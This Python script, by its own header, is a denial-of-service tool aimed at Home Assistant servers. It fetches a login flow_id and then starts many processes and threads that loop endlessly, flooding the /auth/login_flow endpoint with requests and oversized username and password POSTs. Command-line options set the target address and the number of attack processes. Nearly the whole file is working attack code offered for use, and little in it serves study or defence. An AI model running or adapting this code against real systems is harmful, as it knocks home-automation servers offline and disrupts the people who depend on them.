"""
    Author: Long Nguyen
    Description: This is a modification of ha_bruteforce.py to perform Denial of Service (DOS) attack on HomeAssistant server
"""


import subprocess
import multiprocessing
import threading
import sys
import json

def get_flow_id(host):
    data = "{\"client_id\":\"http://"+ host +"/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://"+ host +"/lovelace/0?auth_callback=1\"}"
    headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
    host = host + "/auth/login_flow"

    curl_result = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
    flow_id = ""
    try:
        json_object = json.loads(curl_result.stdout.decode())

        # Make sure we are dealing with homeassistant server and not with other server who might use the same Json format.
        # Do this if an user enters a non-HomeAssistant address but somehow still get the flow_id
        handler = json_object.get("handler")
        if handler == ["homeassistant", None]:
            flow_id = json_object.get("flow_id")

    except json.decoder.JSONDecodeError:
        print("Error: Fail to get flow_id from", host)
    return flow_id


# Perform DOS attack with GET requests
# This function is a modification of get_flow_id()
def dos_get(host):
    data = "{\"client_id\":\"http://"+ host +"/\",\"handler\":[\"homeassistant\",null],\"redirect_uri\":\"http://"+ host +"/lovelace/0?auth_callback=1\"}"
    headers = "-H \'Content-Type: text/plain;charset=UTF-8\'"
    host = host + "/auth/login_flow"

    # Begin attack: sending GET requests for flow_id using curl
    while True:
        curl_output = subprocess.run(["curl", "-d", data, headers, host, "-s"], stdout=subprocess.PIPE)
        response = curl_output.stdout.decode()
        if response == "":
            print("Fail to send GET request")
            break
        else:
            print("GET Request sent successfully")


# Perform DOS attack with POST requests
def dos_post(host, flow_id):
    # Get ready for to send POST requsts
    client_id = host
    host = host + "/auth/login_flow/" + flow_id
    username = "username" * 100
    username = "\"" + username + "\""
    password = "password" * 100
    password = "\"" + password + "\""
    data = "{\"username\":" + username + ",\"password\":" + password + ",\"client_id\":\"http://"+ client_id +"/\"}"

    # Begin attack: sending POST login request using curl
    while True:
        curl_output = subprocess.run(["curl", "-d", data, host, "-s"], stdout=subprocess.PIPE)
        response = curl_output.stdout.decode()
        if "Failed" in response or response == "":
            print("Fail to send POST request")
            break
        else:
            print("POST Request sent successfully")

# Combine GET and POST requests attack.
def dos_attack(host, flow_id):
    # Starting DOS attack using GET requests
    threading.Thread(target=dos_get, args=(host,)).start()
    threading.Thread(target=dos_get, args=(host,)).start()



    # Starting DOS attack using POST requests
    threading.Thread(target=dos_post, args=(host, flow_id)).start()


def process_arguments():
    host = ""
    num_of_dos = 20
    args = sys.argv
    for i in range(1, len(args)):
        if args[i] == "-s":
            host = args[i+1]
        elif args[i] == "-d":
            num_of_dos = int(args[i+1])

    if len(args) == 1:
        print("Options:")
        print("\t-s: Specify the server's address with port number.")
        print("\t    If port is not provided, the port will be selected appropriately according to the protocol (i.e. HTTP vs HTTPS).")
        print("\t-d: Specify the number of concurrent DOS attack processes. The default is 20.")
        print("\nExample: python ha_dos.py -s 192.168.1.1:8080 -d 20")
        return None

    return host, num_of_dos


def main():
    arguments = process_arguments()

    if arguments is None:
        exit()
    host = arguments[0]
    num_of_dos = arguments[1]
    flow_id = get_flow_id(host)
    for i in range(num_of_dos):
        multiprocessing.Process(target=dos_attack, args=(host, flow_id)).start()


if __name__ == "__main__":
    main()
